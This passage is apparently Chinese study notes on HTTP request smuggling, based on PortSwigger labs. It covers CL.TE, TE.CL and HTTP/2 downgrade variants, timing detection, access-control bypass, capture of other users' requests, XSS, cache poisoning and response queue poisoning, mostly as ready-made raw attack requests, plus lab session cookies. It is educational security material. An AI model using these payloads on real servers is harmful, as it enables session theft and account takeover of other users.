Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

前端处理 `Content-Length: 13` 分割 13 个字节的长度，这样 SMUGGLED 就会被包含到一个请求发送到后端。后端处理采用 `Transfer-Encoding: chunked` 按照0字节的空行分割单个请求，SMUGGLED 就会被作为另一个单独请求处理。   



注：实验中要连续发送两次，才会将留在缓冲区的内容作为下次请求的头进行处理。



### TE.CL

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

前端使用 `Transfer-Encoding: chunked` ，按8个字节将 SMUGGLED 转发给后端，后端使用 `Content-Length: 3` 处理，将前3个字节视为一个请求，将 SMUGGLED 作为下个请求的内容处理。



注：结尾 0 之后要包含 `\r\n\r\n` 



### TE.TE

前后端都支持 TE 头，但其中一个服务器会被某种混淆头诱导从而不处理该头，一些常见的混淆头

```http
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked

```

这些混淆技术都对标准 HTTP 规范做了微妙偏离，而实现协议规范的真实代码做不到绝对精确遵守 HTTP 规范，对不同变体的容忍就很常见，因此发现 TE.TE 漏洞就需要找到类似上面的变体，使得前后端只有一个服务器处理它，另一个服务器忽略它。  

根据被诱导不处理 TE 头的顺序，攻击形式与前面 CL.TE 或者 TE.CL 相同。





## 识别漏洞

大多数探测识别 HTTP 请求走私漏洞的技术是发送导致延迟响应。



### CL.TE

对于 CL.TE 类型的漏洞，可以通过发送类似如下请求：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

前端使用 CL 头，转发X之前的内容，将 X 忽略，而后端使用 TE 头，处理第一个 chunk 然后等待下一个 chunk，这里就可以观察到有延迟。  



### TE.CL

对于 TE.CL 类型的漏洞，可以通过发送类似如下请求：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

前端使用 TE 头，转发一部分，忽略 X。后端服务器使用 CL 头，认为有 6 字节数据，会等待更多内容到达，就能观察到延迟。  



注：如果应用有 CL.TE 漏洞，使用 TE.CL 的测试方法可能会干扰到正常用户的请求。为了减少干扰或者保持隐蔽，可以先使用 CL.TE 测试，当测试不成功时再继续 TE.CL 测试。  



### 根据 response 差异确认漏洞存在

当检测到可能存在请求走私漏洞时，可以尝试触发应用 response 响应内容的差异，进一步确认漏洞。  

向应用快速连续发送两个请求：

* 一个攻击请求，用来干扰下一个请求
* 一个正常请求

如果正常请求的响应中包含了预期的干扰，就可以确认漏洞存在。  

示例请求，一个正常请求如下，通过参数传递要检索的字符串：

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

### **CL.TE**  

发送类似如下请求来确认 CL.TE 类型的漏洞：

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

如果存在漏洞，服务端将会收到看起来类似如下请求：

```http
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

由于包含无效 URL，服务端返回 404 状态码，表明攻击请求干扰到了正常请求。  



### **TE.CL**  

发送类似如下请求来确认 TE.CL 类型漏洞：

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```

如果存在漏洞，服务器会收到类似如下请求：

```http
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

同上一节一样，由于包含无效 URL，服务器返回 404，表明攻击干扰到了正常请求。







## 利用

http 请求走私可以被利用的地方取决于漏洞所在的功能模块。



### 绕过前端安全控制策略

一些应用在web前端服务器实施某些安全控制，决定是否允许处理单个请求，通过这些安全控制策略后再被转发到后端服务器。  

假设后端服务器不进一步检查前端发过来的请求，认为已经通过鉴权，这种情况下 http 请求走私就会被利用绕过访问控制，实现对受限 URL 的访问。  

例如用户被允许访问 /home 但不允许访问 /admin。可以使用如下请求走私绕过限制：

```http
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```

前端服务器根据 `Content-Length: 62` 认为收到两个访问 /home 的请求，就转发到后端服务器，后端服务器根据 `Transfer-Encoding` 判断为一个访问 /home 和一个 /admin 的请求，并认为前端服务器已经完成鉴权就允许请求访问。  





### 揭示前端请求重写

很多应用在前端服务器中会修改重写请求，然后再转发给后端服务器，通常是添加一些请求 header，例如：

* 终止 TLS 连接，添加描述所用协议、密码套件相关头部
* 添加包含用户 IP 的 `X-Forwarded-For` 头
* 根据用户的会话令牌确定用户 ID，并添加一个标识该用户的 header
* 其它敏感信息

很多情况下，如果请求走私中缺少前端添加的请求头，后端服务器不会正常处理此请求，就导致走私请求无法产生预期效果。  

有一种简单的方法可以精确揭示前端服务器是如何重写请求：

* 找到一个请求参数的值反射到应用程序响应中的 POST 请求
* 打乱参数顺序，使被反射的参数出现在消息体的最后
* 将这个请求走私到后端服务器，紧接着是一个你希望揭示其重写形式的正常请求



假设一个登录功能，反射了邮箱 email 参数值：

```http
POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=wiener@normal-user.net
```

响应中包含如下值：

```html
<input id="email" value="wiener@normal-user.net" type="text">
```

就可以使用如下形式的请求走私来查看前端服务器的重写逻辑：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=POST /login HTTP/1.1
Host: vulnerable-website.com
...
```

上面的请求被前端服务器重写，包含了额外的 header，然后后端服务器处理走私的请求，并将重写后第二个请求视为 email 的值，将第二个请求的响应反射到这个值：

```html
<input id="email" value="POST /login HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 1.3.3.7
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
X-TLS-Version: TLSv1.2
x-nr-external-service: external
...
```

由于最终请求被重写，我们不知道它有多长。请求走私中的 `Content-Length` 头的值将决定后端服务器认为请求数据有多长，如果太短只能收到部分重写请求，如果设的太长后端服务器可能会一直等待直到超时。一般是猜测一个比提交请求稍大的值，然后逐渐调整增加该值检索更多信息。  





### 绕过客户端认证

作为 TLS 握手的一部分，服务器提供证书向客户端证明自己。证书包含了 CN（Common Name），客户端验证这里的 CN 和正在访问的域名匹配。  

有些网站进一步实现了双向 TLS 认证，客户端也需要向服务器出示证书，这种情况下通常客户端的 CN 是用户名之类的，可以在后端应用程序中用作访问控制的一部分。  

认证客户端的组件通常通过一个或多个非标准 HTTP header 将证书中的信息传递给后端服务器或应用。例如，前端服务器将包含客户端 CN 的头附加到任何传入的请求中：

```http
GET /admin HTTP/1.1
Host: normal-website.com
X-SSL-CLIENT-CN: carlos
```

由于这些 header 完全不经过客户端，由前端服务器添加，后端服务器容易隐式地信任这些请求。  

现实中通常不可利用，因为前端服务器要确认这些内容存在才会添加对应 header。但是如果存在请求走私，前端服务器无法查看到，请求会被原样发送到后端服务器：

```http
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 64
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-SSL-CLIENT-CN: administrator
Foo: x
```







### 捕获其它用户请求

如果应用中包含任何允许存储并检索文本数据地功能，就存在潜在的可以被利用捕获其它用户的数据。这些内容可能是令牌、用户的敏感数据。适合作为攻击载体的功能：评论、邮件、个人资料、屏幕名称等。  

执行此攻击需要走私一个向存储功能提交数据的请求，其中包含要存储数据的参数被放置在最后。  

示例，假设一个博客评论功能使用如下请求：

```http
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net
```

现在将 `Content-Length` 头设置一个较长的值，并将 commont 参数放在最后：

```http
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 330

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
```

这里发送的数据有 144 字节，但 CL 中设置了 400，此时后端服务器将等待其余数据到达，然后才发出 response，或者超时。当另一个请求过来时，剩余字节的数据就被返回：

```http
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
...
```

受害者的数据将被提交到对应的博客评论中，需要捕获更多内容就调整 CL 的值，但需要多轮尝试，超过就会超时。  

portswigger 实验：

```http
POST / HTTP/1.1
Host: 0a7400eb03bb8581809dd00600f1005b.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 327

0

POST /post/comment HTTP/1.1
Host: 0a7400eb03bb8581809dd00600f1005b.web-security-academy.net
Cookie: session=aBLaAZhjy1cd8kyoAHMsx15vjZ6DmIcf
Content-Length: 935
Content-Type: application/x-www-form-urlencoded

csrf=wcIVun0Q5bb19dhlXc3ka5nYjUfA0KNd&postId=1&name=carlos&email=h%40i.j&website=http%3A%2F%2Fk.l&comment=
```

被捕获的请求就被提交到对应 blog 的评论中：

![image-20261029180717793](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261029180717793.png)



这种技术的一个限制是通常会在参数分隔符出现的地方停止，例如常见的 URL 分隔符 `&`。



### 利用反射型 XSS

如果一个应用有请求走私漏洞，同时还有反射型 XSS漏洞，就可以利用请求走私攻击来使应用中的其他用户触发 XSS，这种方法比常规反射型 XSS 的优势有：

* 它不需要与受害者用户进行任何交互。只需要在走私请求中包含一个 XSS Payload 的请求，下一个用户就会命中触发。
* 它可以被利用控制常规反射型 XSS中无法轻易控制的 XSS行为，例如修改请求 header。

示例，应用在 UA 中存在反射型 XSS 漏洞，利用方法如下：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
User-Agent: <script>alert(1)</script>
Foo: X
```

下一个请求的用户将会收到 反射的 XSS Payload，这里是 alert(1)。





### 转换站内重定向为开放重定向

很多应用程序执行从一个 URL 到另一个 URL 的站内重定向，并将 Host 头中的主机名放到重定向 URL 中。Apache、IIS 等 Web 服务器的默认行为：对不带尾部斜杠的文件夹的请求，会收到一个重定向，指向包含尾部斜杠的同一文件夹（Nginx 的配置`server_name_in_redirect` 默认是 `On`，如果被显式设置为 `off` 也会如此）：

```http
GET /home HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```

这种行为通常是无害的，但在 http 请求走私中可以被利用，将其他用户重定向到外部域名。

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```

走私的请求将触发一个到攻击者网站的重定向，将会影响后端服务器处理的下一个用户的请求，例如：

```http
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```

用户这里请求 /scripts/include.js ，攻击者可以在响应中返回自己的 js 的文件给受害者。  





```
1. 应用根据 Host 头生成重定向 URL
   ↓
2. 攻击者走私一个请求，其中 Host 头为 attacker-website.com
   ↓
3. 后端处理走私请求，生成重定向 Location: https://attacker-website.com/...
   ↓
4. 下一个用户的请求被拼接到走私请求后面
   ↓
5. 用户收到 301 重定向到攻击者域名
   ↓
6. 用户浏览器请求攻击者域名 → 攻击者返回恶意内容
```





**相对重定向转换为开放重定向**  

有时候会遇到使用路径为 `Location` header 构造相对 URL 的服务器级重定向，例如：

```http
GET /example HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: /example/
```

如果服务器允许在路径中使用协议相对 URL，这仍然可以被用于开放重定向：

```http
GET //attacker-website.com/example HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: //attacker-website.com/example/
```





```
正常根相对重定向：
GET /example → Location: /example/
  ↓
浏览器解释为：https://vulnerable-website.com/example/

协议相对 URL 绕过：
GET //attacker-website.com/example → Location: //attacker-website.com/example/
  ↓
浏览器解释为：https://attacker-website.com/example/
```

**核心**：`//` 开头的 URL 被浏览器解释为“协议相对”——使用当前页面的协议（如 `https`），但域名是 `//` 后面的部分。服务器如果直接将路径拼接到 `Location` 中，就会生成一个指向外部域名的重定向。  







### Web 缓存投毒

类似前面攻击形式的还有一种变体，可能利用 http 请求走私造成 web 缓存投毒攻击。如果前端基础设施出与性能等原因考虑，部分执行内容缓存，就有可能利用站外重定向 response 来向缓存投毒。这种攻击会持久化到缓存中，影响后续请求的用户。  

假设攻击者向服务端发送如下请求：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 59
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /static/include.js HTTP/1.1
Host: vulnerable-website.com
```

走私的请求到达后端服务，后端服务器像之前一样执行站外重定向的 response 返回。前端服务器将这个 response 内容缓存到所认为的第二个请求(/static/include.js)中的 URL 中：

```http
GET /static/include.js HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```

后续用户请求此 URL 时，将会收到攻击者网站的重定向。  





### Web 缓存欺骗

另一个变体是 Web 缓存欺骗。  

web 缓存投毒和 web 缓存欺骗的区别：

* web 缓存投毒是攻击者引起应用程序存储一些恶意上下文到缓存中，其他用户会受到缓存中的恶意上下文影响
* web 缓存欺骗是攻击者引起应用程序存储一些其他用户的敏感信息到缓存中，攻击者从缓存中检索这些信息



示例，攻击者构造一个走私请求包含了获取用户隐私信息：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 43
Transfer-Encoding: chunked

0

GET /private/messages HTTP/1.1
Foo: X
```

下一个用户的请求 png 资源，被追加转发到后端服务器，包含了 session 、cookie 等信息，如下：

```http
GET /private/messages HTTP/1.1
Foo: XGET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com
Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z
...
```

后端将该消息作为正常请求处理，返回包含个人隐私信息的内容，前端服务器将 response 作为第二个 URL 请求的缓存，这里是 `/static/some-image.png` ：

```http
GET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 200 Ok
...
<h1>Your private messages</h1>
...
```

攻击者再访问该 URL 就能获取到敏感信息。  

不过这里攻击者不能提前直到受害者样访问的 URL 资源，因此需要大量检索静态资源 URL 以获取内容。  





## 高级请求走私



### HTTP/2 请求走私

HTTP/2 有时反而让网站更容易遭受请求走私攻击。  

#### HTTP/2 消息长度

请求走私从根本上讲是利用不同服务器之间对长度解析的差异。HTTP/2 引入了一种单一的、稳健的机制，一直被认为对请求走私免疫。  

HTTP/2 消息是以一系列“帧”发送，每个帧前面有一个显式的长度字段，告诉服务器读取多少字节。因此请求的长度是帧长度的总和。     

理论上这种机制是没有机会引入请求走私所需的歧义，但是协议降级会导致这种情况。  

#### HTTP/2 降级

HTTP/2 降级是使用 HTTP/1 的语法重写 HTTP/2 请求以生成等效的 HTTP/1 请求。Web服务器和反向代理服务器经常处于这个位置，向客户端提供 HTTP/2 支持，重写后转发到仅支持 HTTP/1 的后端服务器。



#### HTTP/2 消息表示说明

由于 HTTP/2 是二进制协议，BurpSuite 在文章中使用了一些人类可读形式表示 HTTP/2消息：

* 每条消息显示为单个实体，而不是独立“帧”
* 使用纯文本和值字段显示头部
* 在伪头部名称前加上冒号，以区别普通头部

但在真实传输中消息并非这种形式。  



一些说明：

* 换行符、冒号等字符在 HTTP/2 请求中没有特殊含义，并且可以以 HTTP/1 中不可能的方式注入。
* 伪头部，几个伪头部有效地取代了 HTTP/1 的请求行和状态行，共有五个伪头部
  * `:method` - 请求的 HTTP 方法，如 GET 或 POST。
  * `:path` - 请求路径。注意这包括查询字符串。
  * `:authority` - 大致相当于 HTTP/1 中的 Host 头。
  * `:scheme` - 请求方案，通常是 http 或 https。注意在 HTTP/1 中没有等价物。
  * `:status` - 响应状态码。
  * 在真实传输线路上，这些名称只是二进制字节，实际上并不包含冒号，这只是以人类可读格式呈现此信息的一种方式



#### H2.CL 漏洞

HTTP/2 无需在头部中指定长度。但在降级期间，前端服务器通常会添加一个 HTTP/1 的 `Context-Length` 头，使用 HTTP/2 的内置长度机制推导长度值。HTTP/2 也可以包含 `Context-Length` 头，有些前端服务器会简单的复用该值。  

HTTP/2 规范规定请求中的任何 `Context-Length` 头必须与使用内置计算机制的长度匹配，但是在降级之前并不是总做验证。前端使用 HTTP/2 中隐式的长度确定请求的结束位置，但是 HTTP/1 后端必须使用我们注入的 CL 头，从而导致反同步。  

示例，前端 HTTP/2：

```http
:method	POST
:path	/example
:authority	vulnerable-website.com
content-type	application/x-www-form-urlencoded
content-length	0
GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1
```

后端 HTTP/1：

```http
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1GET / H
```

注：在执行某些请求走私时，你希望追加受害者的头部到走私前缀上，但是一些情况下这些头部会干扰攻击，导致头部重复之类的问题。上面示例使用在走私前缀包中包含一个尾随参数和一个 `Context-Length` 头缓解该问题。通常使用一个比正文稍长的 `Context-Length` 头，受害者请求头仍会被追加到你的走私前缀上，但会在头部之前被截断。  





#### H2.TE 漏洞

HTTP/2 不兼容分块传输编码，任何注入的 `Transfer-encoding: chunked` 头都应该被剥离，或者完全阻止请求。  

如果前端服务器未实现拒绝或剥离分块传输编码，就会存在 H2.TE 请求走私攻击。  

示例，前端 HTTP/2 ：

```http
:method	POST
:path	/example
:authority	vulnerable-website.com
content-type	application/x-www-form-urlencoded
transfer-encoding	chunked
0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```

后端 HTTP/1：

```http
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```





#### 隐藏 HTTP/2 支持

浏览器和一些客户端通常只使用 HTTP/2 和那些在 TLS 握手期间通过 ALPN 明确宣称支持它的服务器通信。  

一些服务器支持 HTTP/2 ，但由于配置错误等原因未能声明，因此客户端会回退到 HTTP/1 ，这是很多客户端软件的默认行为。但可能测试需要强制 HTTP/2 。  

强制 BurpSuite 使用 HTTP/2 ：

1. 在设置对话框中，转到 Tools > Repeater。
2. 在 Connections 下，启用 Allow HTTP/2 ALPN override 选项。
3. 在 Repeater 中，转到 Inspector 面板并展开 Request attributes 部分。
4. 使用开关将 Protocol 设置为 HTTP/2。Burp 现在将在此选项卡上使用 HTTP/2 发送所有请求，无论服务器是否宣称支持它。  





### Response 队列投毒

响应队列投毒是请求走私中一种强大的攻击形式，会导致前端服务器开始将来自后端的响应映射到错误的请求上。  

通过走私一个完整的请求，从而实现后端期望一个响应时，引出两个响应。  

#### 影响

一旦队列被投毒，攻击者只要发出任意后续请求，就可以捕获到其它用户的请求响应。可能包含用户敏感数据、业务数据、会话令牌等。可能导致攻击者获取受害者账户的完全控制权。     



#### 构造队列投毒攻击

实施响应队列投毒，需要满足如下条件：

* 前端服务器和后端服务器之间的 TCP 被多个请求/响应周期性复用。
* 攻击者能够成功走私一个完整的、独立的请求，该请求从后端服务器收到自己独立的响应。
* 攻击不会导致任一服务器关闭 TCP 连接，因为无法确认请求应在何处结束，服务器通常在收到无效请求时关闭连接。



**后果**  

请求走私通常涉及走私一个部分请求，服务器将其作为前缀添加到下一个请求的开头。走私请求的内容会影响初始攻击之后连接上发生的事情。  

![image-20261102185723866](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261102185723866.png)

如果只走私一个请求行和一些头部，假设连接上不久之后又发送另一个请求，后端最终会看到两个完整的请求。  

如果改为走私一个包含请求体的请求，连接上下一个请求将被追加到请求走私的请求体上。通常会产生根据 CL 头截断最终请求的副作用。后端实际看到三个请求，其中第三个请求只是一系列剩余字节，如下所示：     

前端（CL）：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 120
Transfer-Encoding: chunked

0

POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 25

x=GET / HTTP/1.1
Host: vulnerable-website.com
```

后端（TE）：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 120
Transfer-Encoding: chunked

0

POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 25

x=GET / HTTP/1.1
Host: vulnerable-website.com
```

由于第三个请求不构成有效请求，通常会导致错误，服务器关闭连接。  

如果稍加注意，走私一个完整的请求，一次恰好发送两个请求，连接上的任何后续请求都将保持不变：  

前端（CL）：

```http
POST / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
Content-Type: x-www-form-urlencoded\r\n
Content-Length: 61\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /anything HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
GET / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
```

后端（TE）：

```http
POST / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
Content-Type: x-www-form-urlencoded\r\n
Content-Length: 61\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
GET /anything HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
GET / HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
\r\n
```

没有无效请求，攻击后的连接仍应保持开放。  



#### Desynchronizing the response queue 脱同步

当走私一个完整请求时，前端服务器仍认为之转发了一个请求，后端看到两个完整请求，会发送两个完整响应：

![image-20261102185756892](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261102185756892.png)

前端正确地将第一个响应映射到最初的“包装”请求，并将其转发给客户端。由于没有其它请求在等待响应，该响应会被保存在前端和后端连接上的一个队列中。  

当前端收到另一个请求，会将其转发给后端，然而在发送响应时会发送队列中第一个响应，即走私请求对应的响应。  

来自后端的正确响应没有匹配的请求，每次通过一个连接向前端转发新请求时，这个循环都会重复。  





#### 窃取其他用户的响应

一旦响应队列被投毒，攻击者只要发送也给任意请求，就可以捕获另一个用户的请求响应。  

![image-20261102190442102](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261102190442102.png)

攻击者无法控制收到哪些响应，因为他们总是被发送队列中的下一个响应，即对应上一个用户请求的响应。利用 Trunder 之类的自动化工具，攻击者可以轻松的重复这个过程，抓取一些用户的响应信息，进而从中获取有用的信息。     

只要前端/后端连接保持开放，攻击者就可以持续窃取响应。连接的关闭时间因服务器而异，常见的默认值是处理完 100 个请求后终止，但攻击者可以重新投毒一个新的连接继续窃取。  



注：为了区分窃取的响应和自己的请求，可以尝试在发送的两个请求都使用不存在的路径，这样你的请求都会一致的收到 404 之类的响应。  







### CRLF 注入

尽管网站预防基础的 H2.CL 或者 H2.TE 注入，采取例如验证 CL 头、剥离 TE 头等手段。但是 HTTP/2 的二进制形式开启了一些新型的绕过前端服务器的机制。  

HTTP/1 中，有时可以利用服务器处理 `\n` 换行符之间的差异注入走私的头部，例如后端识别 `\n` 为分隔符，但前端不将其视为 header 分隔符，有些前端就无法检测到第二个header：

```http
Foo: bar\nTransfer-Encoding: chunked
```

但这种差异在 `CLRF(\r\n)` 序列时并不存在，因为所有服务器都支持这种分隔符。  

由于 HTTP/2 是基于二进制而非文本的，每个头部的边界基于显式、预定的偏移量，而不是分隔符，因此 `\r\n` 这种在头部中不具有特殊意义，不会被分割：

```http
foo: bar\r\nTransfer-Encoding: chunked
```

当被重写为 HTTP/1 请求时，`\r\n` 将再次被解释为分隔符，HTTP/1 的后端服务器将看到两个 header：

```http
Foo: bar
Transfer-Encoding: chunked
```



portswigger 实验可以通过修改邮箱功能获取：

使用 wiener 用户登录。  

找一个POST请求，发送到 repeater，在 inspector 中增加一个 header `foo` ，填入下面的值(回车需要 Shift+Return 输入)：

```http
bar
Transfer-Encoding: chunked
```

body 部分：

```http
0

POST /my-account/change-email HTTP/1.1
Host: 0a8e00580325e063807f3af8008800f4.web-security-academy.net
Cookie: session=970VaAzitHKF01p7Zkicsf6biZF9Dqmx
Content-Length: 1044

csrf=MgvJ57uHjYRu24ooa7h40ir6zNmZ4HH9&email=ddd@eee.fffff
```

随后在 wiener 的主页可以看到信息：

```text
Your username is: wiener

Your email is: g@h.iGET / HTTP/1.1 Host: 0a8e00580325e063807f3af8008800f4.web-security-academy.net sec-ch-ua: "Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156" sec-ch-ua-mobile: ?0 sec-ch-ua-platform: "Linux" upgrade-insecure-requests: 1 user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36 accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 sec-fetch-site: none sec-fetch-mode: navigate sec-fetch-user: ?1 sec-fetch-dest: document accept-encoding: gzip, deflate, br, zstd accept-language: en-US,en;q=0.9 priority: u=0, i cookie: victim-fingerprint=BNfRyJHxkWsBFENck6gYJtEG8413R6Nf; secret=c725dAnH2RYtcVyiUF3TQ77mALwz3KSW; session=STdYYllu2hxpvBVY070CZjeNCi2H82Nj; _lab_analytics=JFzRsRqzPK8o2xLiBgofPp6fqqt2enQILdH71HbTNzN1DrWLko8TGU7ZH2MGxs2olswkJ8bjzKvvaX9p1d8dFw6Jrv3YzjcW0WID9MDoeA9pkKnlcrrGAejG1bfZ70zbDSFNBo52AbjeXXwcyuUDURE

```



官方的使用 search 缓存功能更简洁，这个邮箱修改还需要获取 csrf 值。  



### HTTP/2 请求分割

前面在响应队列中分割请求时，都是在消息内部中进行拆分。但当存在 HTTP/2 降级时，也可以让拆分发生在 HTTP 的 header 中。  

这种方法更通用，不依赖使用允许包含请求体的请求方法。例如甚至可以使用 GET 请求：

```http
:method	GET
:path	/
:authority	vulnerable-website.com
foo	
bar\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: vulnerable-website.com
```

这在 `Content-Length` 被验证且后端不支持 TE 分块编码的情况下也可以使用。     

要在请求头拆分，需要了解前端如何重写请求，在手动添加 HTTP/1 头部时添加上那些必要的头部。  
例如需要确保后端收到的每个请求都包含 `Host` 头，前端服务器通常在降级前剥离 `:Authority` 伪头部，并用新的 HTTP/1 的 `Host` 头替换它。有不同的实现方法，因此在注入时需要根据情况将 `Host` 头放在不同位置。  

示例：

```http
:method	GET
:path	/
:authority	vulnerable-website.com
foo	
bar\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: vulnerable-website.com
```

在重写过程中，一些前端服务器会将新的 `Host` 头追加到当前头部列表的末尾。对于上面的请求是在 foo 的后面，这样将位于后端拆分点之后，第一个请求将完全没有 `Host` 头。这种情况下需要调整注入的 `Host` 的位置，将其落入拆分后第一个请求中：

```http
:method	GET
:path	/
:authority	vulnerable-website.com
foo	
bar\r\n
Host: vulnerable-website.com\r\n
\r\n
GET /admin HTTP/1.1
```

其它类似的情况也是需要调整 header 的位置适配请求拆分。  





### HTTP 请求隧道

之前的请求走私都是基于前端和后端之间的同一连接处理多个请求。  

一些安全策略严格的服务器只允许来自相同 IP 或相同客户端的请求重用连接，这就限制了使用前述请求走私所能实现的目标，没有明显的方式来影响其它用户流量。        

![image-20261103115842242](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261103115842242.png)



虽然无法毒化套接字干扰其他用户的请求，但仍然可以通过发送一个会从后端引出两个响应的单一请求。这样能够完全对前端隐藏一个请求及匹配的响应。  

